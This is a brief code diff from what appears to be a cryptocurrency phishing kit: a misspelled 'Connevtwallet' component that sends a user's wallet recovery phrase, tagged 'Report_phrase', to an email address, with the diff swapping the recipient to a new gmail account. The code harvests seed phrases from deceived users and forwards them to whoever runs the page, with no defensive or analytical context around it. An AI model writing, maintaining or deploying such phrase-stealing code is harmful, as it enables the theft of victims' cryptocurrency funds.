@@ -51,7 +51,7 @@ const Connevtwallet = () => {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "getkepla@gmail.com"
+        "Coinstorehelp@gmail.com"
       )
         .then(() => {
           setValue({
